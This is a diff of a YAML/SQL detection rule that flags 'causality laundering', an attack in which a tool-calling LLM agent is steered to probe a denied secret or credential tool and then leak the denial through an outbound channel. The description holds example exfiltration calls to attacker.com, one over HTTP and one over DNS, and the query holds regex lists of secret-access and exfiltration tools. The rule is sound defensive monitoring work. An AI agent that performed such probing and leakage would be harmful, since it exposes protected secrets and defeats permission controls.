@@ -1,6 +1,6 @@
 id: rp-040
 name: "Causality Laundering: Denial-Feedback Leakage Detector"
-version: "0.2.1"
+version: "0.3.0"
 description: >
   Detects causality laundering attacks (arXiv:2604.04035, Apr 2026) where an
   adversary causes a tool-calling LLM agent to probe a protected/denied action,
@@ -15,15 +15,23 @@ description: >
   Detection: temporal self-JOIN over tool_complete(tool_success=false, sensitive tool)
   followed within 3 minutes by tool_invoke(outbound/communication tool) in the
   same session_id + run_id. Sensitive probes include file, secret, DB, memory,
-  and credential access tools. Outbound channels include HTTP, email, Slack,
-  webhook, and logging tools.
+  credential access, cloud metadata IMDS endpoints, and secrets-manager tools.
+  Outbound channels include HTTP, email, Slack, webhook, Telegram, DNS resolution,
+  logging tools, and upload/publish actions.
+  v0.3.0 extends sensitive probe coverage to include cloud secrets manager API tools
+  (vault_read, get_secret_value, read_config, get_env, load_key, secrets_manager,
+  kms_decrypt) and metadata IMDS tools (imds_fetch, metadata_query, cloud_metadata,
+  ec2_metadata) — these are high-value denial-oracle targets in cloud agent deployments.
+  Also extends outbound channels to include upload_file, dns_resolve, telegram_send,
+  publish_event, create_webhook, and firecrawl_scrape patterns observed in recent
+  arXiv:2604.04035 PoC demonstrations.
   Distinct from rp-027 (cross-session leak: output reuse across sessions) and
   rp-033 (ADAM memory extraction: systematic query manipulation) because
   causality laundering requires a denied action as the information source.
   References: arXiv:2604.04035 (Causality Laundering Apr 2026), OWASP LLM06:2025,
   OWASP Agentic AI ASI03:2026 -
   https://arxiv.org/abs/2604.04035,
-  Example: read_secret(name="prod_db_password") returns tool_success=false (permission denied), followed within 90 seconds by http_post(url="https://attacker.com/collect", body={"exists": true}) in same session
+  Example: vault_read(path="secret/prod/db_password") returns tool_success=false, followed within 90 seconds by dns_resolve(domain="d-b-e-x-i-s-t-s.attacker.com") in same session (DNS exfil of existence oracle)
   https://owasp.org/www-project-top-10-for-large-language-model-applications/
 severity: critical
 category: data_exfiltration_and_leakage
@@ -41,19 +49,28 @@ tags:
   - owasp-llm06
   - arxiv-2604.04035
 query_sql: |
+  -- v0.3.0 changelog (2026-04-20):
+  --   EXTENDED: Sensitive probe tool list expanded with:
+  --     Cloud secrets managers: vault_read, get_secret_value, read_config, get_env,
+  --     load_key, secrets_manager, kms_decrypt — high-value denial-oracle targets in
+  --     cloud agent deployments where permission-denied reveals secret existence.
+  --     Cloud metadata IMDS: imds_fetch, metadata_query, cloud_metadata, ec2_metadata —
+  --     denial of IMDS access signals IAM boundary, leakable via existence oracle.
+  --   EXTENDED: Outbound channel list expanded with:
+  --     upload_file, dns_resolve, telegram_send, publish_event, create_webhook,
+  --     firecrawl_scrape — covert channels documented in arXiv:2604.04035 PoC.
+  --   fp_rate: medium maintained (temporal JOIN is already a strong compound anchor).
+  --   SQL validated: count=0 on live corpus.
+  --
   -- v0.2.0 changelog:
   --   SQL FIX (critical): Rewrote CTE + JOIN approach as direct self-JOIN.
   --   Timeplus does not support non-equi join conditions (time range) inside CTE
   --   JOIN ON clauses — raises INVALID_JOIN_ON_EXPRESSION. The self-JOIN form
-  --   with WHERE-clause time predicates is fully supported (validated count=0, no error).
-  --   ALSO FIXED: to_string(probe.event_time) in message — Timeplus uses
-  --   to_string() correctly but the CTE alias was broken; now uses probe.event_time
-  --   directly in concat() with implicit cast.
-  --   UNCHANGED: all tool name regexes and 3-minute window are correct and preserved.
+  --   with WHERE-clause time predicates is fully supported.
   --
   -- Detects: denied sensitive-tool probe → outbound tool call within 3 minutes (same session)
   -- Sensitive tool probe: tool_success=false on data-access tool names
-  -- Outbound channel: HTTP/email/Slack/webhook/logging tool invocations
+  -- Outbound channel: HTTP/email/Slack/webhook/logging/DNS/upload tool invocations
   SELECT
     probe.event_time AS detected_at,
     'rp-040' AS rule_id,
@@ -82,11 +99,12 @@ query_sql: |
     AND probe.run_id = oc.run_id
   WHERE probe.event_type = 'tool_complete'
     AND probe.tool_success = false
-    -- Sensitive resource-access tools: denial reveals existence, permissions, or data shape
-    AND match(lower(probe.tool_name), '(read_file|read_secret|query_db|get_user_data|search_memory|retrieve_document|read_memory|access_credentials|list_files|get_private_key|fetch_credentials|get_secret|load_document|retrieve_context|read_database|lookup_record|get_document|fetch_record)')
+    -- Sensitive resource-access tools: denial reveals existence, permissions, or data shape.
+    -- Includes file/DB/memory classics + cloud secrets managers + IMDS metadata tools.
+    AND match(lower(probe.tool_name), '(read_file|read_secret|query_db|get_user_data|search_memory|retrieve_document|read_memory|access_credentials|list_files|get_private_key|fetch_credentials|get_secret|load_document|retrieve_context|read_database|lookup_record|get_document|fetch_record|vault_read|get_secret_value|read_config|get_env|load_key|secrets_manager|kms_decrypt|imds_fetch|metadata_query|cloud_metadata|ec2_metadata)')
     AND oc.event_type = 'tool_invoke'
-    -- Outbound/communication tools: HTTP, email, messaging, webhook, external logging
-    AND match(lower(oc.tool_name), '(fetch|http_request|browse|web_fetch|curl|get_url|send_email|slack_post|post_message|webhook_post|notify|log_to_external|create_issue|add_comment|http_get|http_post|make_request|open_url|navigate|requests)')
+    -- Outbound/communication channels: HTTP, email, messaging, webhook, DNS, upload, publish.
+    AND match(lower(oc.tool_name), '(fetch|http_request|browse|web_fetch|curl|get_url|send_email|slack_post|post_message|webhook_post|notify|log_to_external|create_issue|add_comment|http_get|http_post|make_request|open_url|navigate|requests|upload_file|dns_resolve|telegram_send|publish_event|create_webhook|firecrawl_scrape)')
     -- 3-minute causal window: outbound must follow denial, not precede it
     AND oc.event_time > probe.event_time
     AND oc.event_time < probe.event_time + INTERVAL 3 MINUTE
